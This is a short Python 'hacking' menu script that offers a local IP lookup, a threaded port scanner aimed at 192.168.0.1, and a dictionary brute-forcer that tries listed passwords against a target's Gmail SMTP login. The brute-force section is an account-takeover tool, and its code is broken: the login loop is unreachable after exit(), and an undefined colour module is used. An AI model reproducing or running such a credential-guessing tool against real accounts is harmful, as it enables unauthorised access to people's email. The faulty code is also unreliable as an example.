print("NETHack")
idnt = input("ID: ")
if idnt == "6395":
    print("Utilities")
    print("1) IP")
    print("2) PortScaner")
    print("3) BruteForce") 
    select = input("Utility: ")
    
    if select == "1":
        print("Your IP adress:")
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("gmail.com",80))
        print(s.getsockname()[0])
        s.close()
        
    if select == "2":
        print("Ports")
        import socket
        def scan_port(ip,port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            try:
                connect = sock.connect((ip,port))
                print('Port :',port,' its open.')
                connect.close()
            except:
                pass
        ip = '192.168.0.1'
        for i in range(1000):
            scan_port(ip,i)
        import threading

        for i in range(1000):
            potoc = threading.Thread(target=scan_port, args=(ip,i))
            potoc.start()
            
    if select == "3":
        print("BruteForce")
        import smtplib
        print ('1. Start')
        print ('2. Exit')
        option = input('> ')
        if option == '1':
            passlist = input('Enter password_list: ')
            if option == '2':
                exit()
                pass_found = open(passlist, 'r')
                user_name = input('Target email: ')
                server = smtplib.SMTP('smtp.googlemail.com',587)
                server.ehlo()
                server.starttls()
                for password in pass_found:
                    try:
                        server.login(user_name, password)
                        print(Fore.GREEN + '[+] Password Found: ' + password)
                        break;
                    except smtplib.SMTPAuthenticationError:
                        print(Fore.RED + '[-] Password not founded')
        input()
        
